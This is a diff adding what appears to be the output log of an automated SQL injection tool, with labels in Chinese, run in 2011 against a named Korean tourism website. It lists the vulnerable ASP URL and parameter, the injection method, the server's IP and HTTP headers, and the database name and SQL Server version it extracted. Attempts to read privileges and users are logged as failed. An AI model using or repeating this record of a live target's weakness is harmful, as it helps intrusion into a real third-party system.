@@ -1,0 +1,45 @@
+■漏洞信息:============================================================
+ ·URL:http://www.jejutoursite.co.kr/board/qna/qna_view.asp?gotopage=1&block=&id=23356
+ ·页面标题：力林咯青荤捞飘俊辑 窃膊 窍绰 力林档咯青..
+ ·参数:gotopage=1&block=&id=23356
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:66.232.146.191
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 15:05:33 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+pragma: no-cache
+cache-control: private
+Content-Length: 13678
+Content-Type: text/html
+Expires: Sat, 02 Apr 2011 15:05:32 GMT
+Set-Cookie: ASPSESSIONIDSSSTBAAD=GHBCIIKDFMBOBHMGAPMLGPIE; path=/
+Cache-control: no-cache
+
+
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:JejuNonStop_renew
+ ·版本:Microsoft SQL Server  2000 - 8.00.2055 (Intel X86) 
+	Dec 16 2008 19:46:53 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
